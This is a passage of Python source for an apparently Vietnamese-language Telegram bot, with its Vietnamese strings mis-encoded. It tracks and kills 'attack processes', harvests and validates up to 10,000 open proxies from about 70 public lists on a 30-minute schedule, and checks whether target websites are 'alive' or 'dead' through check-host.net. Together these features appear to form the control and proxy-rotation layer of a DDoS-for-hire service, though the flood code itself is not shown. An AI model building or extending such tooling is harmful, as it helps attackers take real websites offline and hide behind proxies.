        user_id = query.from_user.id
        current_time = time.time()
        
        url = query.message.text.split('Website: ')[1].split('\n')[0].strip()
        if url.startswith('<code>'):
            url = url[6:-7]
            
        status_check_counts[message_id] += 1
        
        if status_check_counts[message_id] > MAX_CHECK_ATTEMPTS:
            await query.message.delete()
            await query.answer(
                "‚ùå Max check attempts exceeded",
                show_alert=True
            )
            return
            
        last_check = status_check_cooldowns.get(user_id, 0)
        if current_time - last_check < STATUS_CHECK_COOLDOWN:
            remaining = round(STATUS_CHECK_COOLDOWN - (current_time - last_check))
            remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
            await query.answer(
                f"‚è≥ ƒê·ª£i {remaining}s ƒë·ªÉ ki·ªÉm tra l·∫°i\n"
                f"üìä {remaining_checks} l∆∞·ª£t ki·ªÉm tra",
                show_alert=True
            )
            return
            
        status_check_cooldowns[user_id] = current_time
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("üîç Ki·ªÉm tra Website", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("‚è≥ ƒêang x·ª≠ l√Ω", callback_data="cooldown")
            ]
        ])

        remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
        await query.message.edit_text(
            f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚è≥ ƒêANG KI·ªÇM TRA WEBSITE
‚ïë ‚Ä¢ Website: <code>{url}</code>
‚ïë ‚Ä¢ {remaining_checks} l∆∞·ª£t ki·ªÉm tra
‚ïë ‚ö†Ô∏è Vui l√≤ng ƒë·ª£i...
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        try:
            response = await asyncio.wait_for(
                asyncio.get_event_loop().run_in_executor(
                    None, 
                    lambda: requests.get(url, timeout=10)
                ),
                timeout=10
            )
            
            status_code = response.status_code
            if status_code == 200:
                status = "üü¢ S·ªëng"
            elif status_code >= 500:
                status = "üî¥ Ch·∫øt"  
            else:
                status = f"üü° Ph·∫£n h·ªìi: {status_code}"
                
        except (requests.Timeout, asyncio.TimeoutError):
            status = "üî¥ TIMEOUT HO·∫∂C Ch·∫øt"
            response = None
            
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("üîç Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("üìä Ki·ªÉm tra nhanh", callback_data=f"st_{url}")
            ]
        ])
        
        response_time = response.elapsed.total_seconds() if response else 10
        await query.message.edit_text(
            f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìä TR·∫†NG TH√ÅI WEBSITE
‚ïë ‚ñ∂ Th√¥ng tin:
‚ïë ‚Ä¢ Website: <code>{url}</code>
‚ïë ‚Ä¢ Tr·∫°ng th√°i: {status}
‚ïë ‚Ä¢ Th·ªùi gian ph·∫£n h·ªìi: {response_time:.2f} gi√¢y
‚ïë ‚Ä¢ Ki·ªÉm tra l·∫°i: {STATUS_CHECK_COOLDOWN} gi√¢y
‚ïë ‚Ä¢ {remaining_checks} l∆∞·ª£t ki·ªÉm tra
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error checking status: {e}")

async def cleanup_attacks():
    """Clean up all running attack processes"""
    for chat_id, process in attack_processes.items():
        try:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        except Exception as e:
            logger.error(f"Error cleaning up process for chat {chat_id}: {e}")
    attack_processes.clear()

# Start Proxy
from datetime import datetime, timedelta
import asyncio
# C√°c bi·∫øn global ƒë·ªÉ ki·ªÉm so√°t
last_proxy_update = 0
PROXY_UPDATE_INTERVAL = 1800  
MAX_UPDATE_TIME = 1740  
proxy_update_lock = asyncio.Lock()
is_updating = False  
is_proxy_update_running = False
is_proxy_update_running = False
proxy_cron_task = None
async def check_proxy(proxy, timeout=5):
    """Ki·ªÉm tra proxy c√≥ ho·∫°t ƒë·ªông kh√¥ng"""
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://google.com",
                proxy=f"http://{proxy}",
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                return response.status == 200
    except:
        return False

async def update_proxy(restart=False):
    try:
        logger.info("Starting proxy update...")
        start_time = time.time()
        KEEP_BEST_PROXIES = 10000
        MAX_ATTEMPTS = 3
        MIN_NEW_PROXIES = 100  # S·ªë l∆∞·ª£ng proxy m·ªõi t·ªëi thi·ªÉu c·∫ßn t√¨m
        
        proxy_path = './modules/proxy.txt'
        existing_proxies = set()  # S·ª≠ d·ª•ng set ƒë·ªÉ tr√°nh tr√πng l·∫∑p
        
        # ƒê·ªçc proxy hi·ªán c√≥ v√† gi·ªõi h·∫°n s·ªë l∆∞·ª£ng n·∫øu c·∫ßn
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    existing_proxies = {line.strip() for line in f if line.strip()}
                logger.info(f"Found {len(existing_proxies)} existing proxies")

                # N·∫øu s·ªë proxy v∆∞·ª£t qu√° gi·ªõi h·∫°n, ch·ªçn ng·∫´u nhi√™n KEEP_BEST_PROXIES proxy
                if len(existing_proxies) > KEEP_BEST_PROXIES:
                    existing_proxies = set(random.sample(list(existing_proxies), KEEP_BEST_PROXIES))
                    logger.info(f"Randomly selected {KEEP_BEST_PROXIES} proxies to keep")
                    
                    # L∆∞u l·∫°i danh s√°ch proxy ƒë√£ gi·ªõi h·∫°n
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(existing_proxies))
                    logger.info(f"Saved {len(existing_proxies)} proxies after limiting")
                
                # Backup file proxy
                backup_path = f"{proxy_path}.backup"
                with open(backup_path, 'w') as f:
                    f.write('\n'.join(existing_proxies))
            except Exception as e:
                logger.error(f"Error reading existing proxies: {e}")
                existing_proxies = set()

        # Danh s√°ch c√°c URL proxy
        proxy_urls = [
            'https://daudau.org/api/http.txt',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=https',
            'http://alexa.lr2b.com/proxylist.txt',
            'http://rootjazz.com/proxies/proxies.txt',
            'http://worm.rip/http.txt',
            'https://api.openproxylist.xyz/http.txt',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
            'https://multiproxy.org/txt_all/proxy.txt',
            'https://openproxylist.xyz/http.txt',
            'https://proxyspace.pro/http.txt',
            'https://proxyspace.pro/https.txt',
            'https://proxy-spider.com/api/proxies.example.txt',
            'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
            'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
            'https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
            'https://raw.githubusercontent.com/jepluk/PROXYLIST/main/all.json',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http_checked.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5_checked.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
            'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt',
            'https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/http.json',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/socks5.json',
            'https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list-raw.txt',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
            'https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt',
            'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
            'https://spys.me/proxy.txt',
            'https://spys.me/socks.txt',
            'https://sunny9577.github.io/proxy-scraper/proxies.txt',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=US',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=transparent&country=US',
            'https://www.proxy-list.download/api/v1/get?type=https',
        ]

        working_proxies = set(existing_proxies)
        used_urls = set()  # Theo d√µi c√°c URL ƒë√£ s·ª≠ d·ª•ng
        BATCH_SIZE = 100
        new_proxies_found = 0

        while len(used_urls) < len(proxy_urls) and new_proxies_found < MIN_NEW_PROXIES:
            # Ch·ªçn URL ch∆∞a s·ª≠ d·ª•ng
            available_urls = [url for url in proxy_urls if url not in used_urls]
            if not available_urls:
                break
                
            url = random.choice(available_urls)
            used_urls.add(url)
            logger.info(f"Attempting to fetch proxies from: {url}")
            
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: requests.get(url, timeout=10)
                )
                response.raise_for_status()
                content = response.text.strip()
                
                if not content:
                    logger.warning(f"Empty response from {url}, trying another URL...")
                    continue
                    
                new_proxies = set()
                for proxy in content.splitlines():
                    proxy = proxy.strip()
                    if proxy and ':' in proxy and proxy not in working_proxies:
                        try:
                            ip, port = proxy.split(':')
                            ipaddress.ip_address(ip)
                            port = int(port)
                            if 1 <= port <= 65535:
                                new_proxies.add(proxy)
                        except:
                            continue

                if not new_proxies:
                    logger.warning(f"No valid new proxies found from {url}, trying another URL...")
                    continue

                logger.info(f"Found {len(new_proxies)} new valid proxies, checking connectivity...")

                # Ki·ªÉm tra v√† l∆∞u proxy theo batch
                for i in range(0, len(new_proxies), BATCH_SIZE):
                    batch = list(new_proxies)[i:i + BATCH_SIZE]
                    tasks = []
                    for proxy in batch:
                        if proxy not in working_proxies:
                            tasks.append(check_proxy(proxy))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        working_batch = set()
                        for proxy, is_working in zip(batch, results):
                            if isinstance(is_working, bool) and is_working:
                                working_batch.add(proxy)
                                working_proxies.add(proxy)
                        
                        if working_batch:
                            async with aiofiles.open(proxy_path, 'a') as f:
                                await f.write('\n'.join(working_batch) + '\n')
                            logger.info(f"Added {len(working_batch)} working proxies to file")
                            new_proxies_found += len(working_batch)

                
            except Exception as e:
                logger.error(f"Error fetching proxies from {url}: {e}")
                continue

        # X·ª≠ l√Ω k·∫øt qu·∫£ cu·ªëi c√πng
        total_duration = time.time() - start_time
        total_new_proxies = len(working_proxies) - len(existing_proxies)
        
        logger.info(
            f"Proxy update completed in {total_duration:.2f}s\n"
            f"URLs checked: {len(used_urls)}/{len(proxy_urls)}\n"
            f"Total proxies: {len(working_proxies)}\n"
            f"New proxies added: {total_new_proxies}"
        )
        
        return len(working_proxies), total_new_proxies

    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        if os.path.exists(f"{proxy_path}.backup"):
            try:
                os.replace(f"{proxy_path}.backup", proxy_path)
                logger.info("Restored proxy file from backup due to error")
            except:
                pass
        return 0, 0

async def clean_proxy_file():
    """L√†m s·∫°ch file proxy, lo·∫°i b·ªè tr√πng l·∫∑p v√† ƒë·ªãnh d·∫°ng kh√¥ng ƒë√∫ng"""
    try:
        proxy_path = './modules/proxy.txt'
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found")
            return 0

        # ƒê·ªçc t·ª´ng d√≤ng proxy
        with open(proxy_path, 'r') as f:
            content = f.read()

        # T√°ch c√°c proxy c√≥ th·ªÉ b·ªã d√≠nh
        # T√¨m t·∫•t c·∫£ c√°c ƒë·ªãa ch·ªâ IP:PORT b·∫±ng regex
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        
        valid_proxies = set()
        invalid_lines = []

        for proxy in potential_proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.add(proxy)
                else:
                    invalid_lines.append(proxy)
            except:
                invalid_lines.append(proxy)

        # T·∫°o backup
        backup_path = f"{proxy_path}.backup"
        with open(backup_path, 'w') as f:
            f.write(content)

        # Ghi l·∫°i file v·ªõi c√°c proxy h·ª£p l·ªá
        valid_proxies = sorted(valid_proxies)
        with open(proxy_path, 'w') as f:
            f.write('\n'.join(valid_proxies))

        # Log k·∫øt qu·∫£
        logger.info(f"""Proxy cleaning results:
        - Original content length: {len(content)}
        - Valid unique proxies: {len(valid_proxies)}
        - Invalid entries removed: {len(invalid_lines)}
        - Invalid entries:
          {chr(10).join('  ' + l for l in invalid_lines[:10])}
          {f'... and {len(invalid_lines) - 10} more' if len(invalid_lines) > 10 else ''}
        """)

        return len(valid_proxies)

    except Exception as e:
        logger.error(f"Error cleaning proxy file: {e}")
        if os.path.exists(backup_path):
            os.replace(backup_path, proxy_path)
        return 0

async def check_and_update_proxy(context: ContextTypes.DEFAULT_TYPE):
    """H√†m callback cho job queue ƒë·ªÉ c·∫≠p nh·∫≠t proxy"""
    global is_proxy_update_running
    
    if is_proxy_update_running:
        logger.warning("Proxy update already in progress, skipping...")
        return
        
    try:
        is_proxy_update_running = True
        logger.info("Running scheduled proxy update...")
        
        proxy_path = './modules/proxy.txt'
        BATCH_SIZE = 100  # X·ª≠ l√Ω theo batch ƒë·ªÉ tr√°nh qu√° t·∫£i
        KEEP_BEST_PROXIES = 10000
        
        # ƒê·ªçc v√† validate proxy hi·ªán c√≥
        try:
            with open(proxy_path, 'r') as f:
                content = f.read().strip()
        except FileNotFoundError:
            content = ""
            logger.warning("Proxy file not found, creating new one")
            
        # T√¨m v√† validate proxy
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        valid_proxies = set()
        
        # X·ª≠ l√Ω theo batch
        for i in range(0, len(potential_proxies), BATCH_SIZE):
            batch = potential_proxies[i:i + BATCH_SIZE]
            for proxy in batch:
                try:
                    ip, port = proxy.split(':')
                    ipaddress.ip_address(ip)
                    port = int(port)
                    if 1 <= port <= 65535:
                        valid_proxies.add(proxy)
                except:
                    continue
                    
            # Log ti·∫øn ƒë·ªô
            logger.info(f"Processed {i + len(batch)}/{len(potential_proxies)} proxies")
                
        # Gi·ªõi h·∫°n s·ªë l∆∞·ª£ng proxy n·∫øu c·∫ßn
        if len(valid_proxies) > KEEP_BEST_PROXIES:
            valid_proxies = set(random.sample(list(valid_proxies), KEEP_BEST_PROXIES))
            
        # Ghi l·∫°i file v·ªõi c√°c proxy h·ª£p l·ªá
        async with aiofiles.open(proxy_path, 'w', newline='') as f:
            await f.write('\n'.join(sorted(valid_proxies)))
            await f.write('\n')
            
        logger.info(f"Saved {len(valid_proxies)} valid proxies")
        
        # Th√™m proxy m·ªõi
        async def save_proxy_to_file(proxy):
            try:
                async with aiofiles.open(proxy_path, 'a', newline='') as f:
                    await f.write(f"{proxy}\n")
                return True
            except Exception as e:
                logger.error(f"Error saving proxy to file: {e}")
                return False
                
        # Ti·∫øp t·ª•c v·ªõi ph·∫ßn update proxy
        working, removed = await update_proxy()
        
        return working, removed
        
    except Exception as e:
        logger.error(f"Error in check_and_update_proxy: {e}")
        return 0, 0
    finally:
        is_proxy_update_running = False
# Cron job ƒë·ªÉ t·ª± ƒë·ªông c·∫≠p nh·∫≠t proxy
async def proxy_cron():
    while True:
        try:
            logger.info("Starting proxy cron job...")
            working, removed = await update_proxy()
            logger.info(f"Cron job completed: {working} working proxies, {removed} removed")
            await asyncio.sleep(1800)  # Ch·ªù 30 ph√∫t gi·ªØa c√°c l·∫ßn c·∫≠p nh·∫≠t
        except Exception as e:
            logger.error(f"Error in proxy cron job: {e}")
            await asyncio.sleep(300)  # N·∫øu l·ªói, ch·ªù 5 ph√∫t r·ªìi th·ª≠ l·∫°i

async def monitor_proxy_updates(context: CallbackContext):
    """Gi√°m s√°t v√† ƒë·∫£m b·∫£o proxy updates ƒëang ho·∫°t ƒë·ªông"""
    try:
        proxy_path = './modules/proxy.txt'
        
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found, triggering update...")
            await check_and_update_proxy(context)
            return
            
        # Ki·ªÉm tra th·ªùi gian s·ª≠a ƒë·ªïi c·ªßa file proxy
        file_modified = os.path.getmtime(proxy_path)
        current_time = time.time()
        
        # N·∫øu file kh√¥ng ƒë∆∞·ª£c c·∫≠p nh·∫≠t trong 2 gi·ªù
        if current_time - file_modified > 7200:  # 2 gi·ªù
            logger.warning("Proxy file hasn't been updated for 2 hours, triggering update...")
            await check_and_update_proxy(context)
            
        # Ki·ªÉm tra s·ªë l∆∞·ª£ng proxy
        try:
            with open(proxy_path, 'r') as f:
                proxy_count = sum(1 for line in f if line.strip())
            
            if proxy_count < 100:  # Ng∆∞·ª°ng t·ªëi thi·ªÉu
                logger.warning(f"Low proxy count ({proxy_count}), triggering update...")
                await check_and_update_proxy(context)
        except Exception as e:
            logger.error(f"Error checking proxy count: {e}")
            
    except Exception as e:
        logger.error(f"Error in proxy monitor: {e}")

async def start_proxy_cron(application: Application):
    """Kh·ªüi ƒë·ªông v√† thi·∫øt l·∫≠p cron job proxy"""
    try:
        logger.info("Initializing proxy cron system...")
        proxy_path = './modules/proxy.txt'
        KEEP_BEST_PROXIES = 10000

        # Clean proxy ngay khi kh·ªüi ƒë·ªông
        logger.info("Cleaning proxy file on startup...")
        await clean_proxy_file()

        # Ki·ªÉm tra v√† gi·ªõi h·∫°n proxy khi kh·ªüi ƒë·ªông
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                
                if len(proxies) > KEEP_BEST_PROXIES:
                    logger.info(f"Initial proxy count: {len(proxies)}, limiting to {KEEP_BEST_PROXIES}")
                    selected_proxies = random.sample(proxies, KEEP_BEST_PROXIES)
                    
                    # Backup file g·ªëc
                    backup_path = f"{proxy_path}.backup"
                    with open(backup_path, 'w') as f:
                        f.write('\n'.join(proxies))
                    
                    # Ghi file m·ªõi v·ªõi proxies ƒë√£ gi·ªõi h·∫°n
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(selected_proxies))
                    logger.info(f"Successfully limited initial proxies to {KEEP_BEST_PROXIES}")

                    # Clean l·∫°i m·ªôt l·∫ßn n·ªØa sau khi gi·ªõi h·∫°n
                    await clean_proxy_file()
            except Exception as e:
                logger.error(f"Error limiting initial proxies: {e}")

        # Thi·∫øt l·∫≠p job ƒë·ªãnh k·ª≥
        job = application.job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,  # 30 ph√∫t
            first=1,
            name='proxy_update'
        )
        
        if job:
            logger.info("Proxy cron job successfully scheduled")
        else:
            logger.error("Failed to schedule proxy cron job")
            
    except Exception as e:
        logger.error(f"Error setting up proxy cron: {e}")
# Th√™m h√†m ƒë·ªÉ ki·ªÉm tra tr·∫°ng th√°i proxy cron
@restrict_room
async def check_proxy_cron_status(update: Update, context: CallbackContext):
    """Ki·ªÉm tra tr·∫°ng th√°i c·ªßa proxy cron job"""
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        proxy_path = './modules/proxy.txt'
        
        # Ki·ªÉm tra file t·ªìn t·∫°i
        if not os.path.exists(proxy_path):
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå KH√îNG C√ì FILE PROXY
‚ïë ‚Ä¢ File proxy.txt kh√¥ng t·ªìn t·∫°i
‚ïë ‚Ä¢ S·ª≠ d·ª•ng /addpx ƒë·ªÉ th√™m proxy
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
            
        # ƒê·ªçc v√† ƒë·∫øm s·ªë proxy
        with open(proxy_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            
        total_proxies = len(proxies)
        
        # Ki·ªÉm tra proxy c√≥ h·ª£p l·ªá kh√¥ng
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
        
        # Ki·ªÉm tra tr·∫°ng th√°i cron job
        jobs = context.job_queue.jobs()
        proxy_jobs = [job for job in jobs if job.name == 'proxy_update']
        
        if proxy_jobs:
            # Chuy·ªÉn ƒë·ªïi th·ªùi gian sang m√∫i gi·ªù Vi·ªát Nam
            next_run_utc = proxy_jobs[0].next_t
            next_run_vn = next_run_utc.astimezone(vietnam_tz)
            next_run = next_run_vn.strftime('%H:%M:%S %d/%m/%Y')
            
            # L·∫•y th·ªùi gian hi·ªán t·∫°i theo m√∫i gi·ªù VN
            current_time = get_vietnam_time()
            time_until = next_run_vn - current_time
            minutes_until = int(time_until.total_seconds() / 60)
            
            message = f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚úÖ PROXY CRON STATUS
‚ïë ‚Ä¢ Tr·∫°ng th√°i: ƒêang ch·∫°y
‚ïë ‚Ä¢ L·∫ßn c·∫≠p nh·∫≠t ti·∫øp theo: {next_run}
‚ïë ‚Ä¢ C√≤n: {minutes_until} ph√∫t
‚ïë üìä TH√îNG TIN PROXY:
‚ïë ‚Ä¢ T·ªïng s·ªë proxy: {total_proxies}
‚ïë ‚Ä¢ Proxy h·ª£p l·ªá: {len(valid_proxies)}
‚ïë ‚Ä¢ Proxy kh√¥ng h·ª£p l·ªá: {len(invalid_proxies)}'''

            if invalid_proxies:
                message += f'''
‚ïë ‚Ä¢ Proxy l·ªói ({min(5, len(invalid_proxies))}):
‚ïë {chr(10).join(f"‚Ä¢ {proxy}" for proxy in invalid_proxies[:5])}'''
                if len(invalid_proxies) > 5:
                    message += f'''
‚ïë ‚Ä¢ V√† {len(invalid_proxies) - 5} proxy l·ªói kh√°c...'''
                    
            message += '''
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê'''

            await update.message.reply_text(message)
        else:
            await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå PROXY CRON STATUS
‚ïë ‚Ä¢ Tr·∫°ng th√°i: Kh√¥ng ho·∫°t ƒë·ªông
‚ïë ‚Ä¢ Vui l√≤ng kh·ªüi ƒë·ªông l·∫°i bot
‚ïë üìä TH√îNG TIN PROXY:
‚ïë ‚Ä¢ T·ªïng s·ªë proxy: {total_proxies}
‚ïë ‚Ä¢ Proxy h·ª£p l·ªá: {len(valid_proxies)}
‚ïë ‚Ä¢ Proxy kh√¥ng h·ª£p l·ªá: {len(invalid_proxies)}
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            
    except Exception as e:
        logger.error(f"Error checking proxy cron status: {e}")
        await update.message.reply_text(f"Error checking cron status: {str(e)}")
# Task Manager Command
async def send_monitoring_info(context: ContextTypes.DEFAULT_TYPE):
    try:
        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        monitoring_info = f"""
‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ„Äå System Monitor „Äç‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚î£‚îÅ‚ä≥ üî≤ CPU: {cpu_percent}%
‚î£‚îÅ‚ä≥ üíæ RAM: {memory_percent}%
‚î£‚îÅ‚ä≥ üìä RAM Used: {memory_used}/{memory_total}GB
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"""

        await context.bot.send_message(
            chat_id=MONITOR_CHAT_ID,
            text=monitoring_info
        )
    except Exception as e:
        logger.error(f"Error in monitoring task: {e}")


@restrict_room
async def task(update: Update, context: CallbackContext):
    global monitoring_task
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # Ki·ªÉm tra xem c√≥ argument "start" ho·∫∑c "stop" kh√¥ng
        if context.args:
            if context.args[0].lower() == "on":
                # Ki·ªÉm tra xem monitoring_task ƒë√£ t·ªìn t·∫°i v√† ƒëang ch·∫°y ch∆∞a
                if monitoring_task and not monitoring_task.removed:
                    await update.message.reply_text("Monitoring ƒë√£ ƒë∆∞·ª£c b·∫≠t!")
                    return
                monitoring_task = context.job_queue.run_repeating(
